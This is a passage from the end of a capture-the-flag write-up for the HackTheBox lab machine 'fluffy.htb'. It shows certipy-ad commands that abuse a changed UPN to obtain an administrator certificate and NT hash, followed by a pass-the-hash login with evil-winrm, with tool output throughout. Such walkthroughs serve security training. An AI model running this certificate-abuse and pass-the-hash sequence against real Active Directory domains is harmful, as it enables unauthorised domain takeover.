[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Revert the "ca_svc" account's UPN:**

```bash
certipy-ad account \
    -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' \
    -user 'ca_svc' update
```

Now, a**uthenticate as the target administrator.**

```bash
sudo ntpdate -u 10.10.11.69 

certipy-ad auth \
    -dc-ip '10.10.11.69' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'fluffy.htb'
    
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

```

Now let’s authenticate as administrator:

```bash
evil-winrm -u administrator -i 10.10.11.69 -H 8da83a3fa618b6e3a00e93f676c92a6e
```

We are now adminsitrator.

![image.png]({{ site.baseurl }}/assets/fluffy/image%206.png)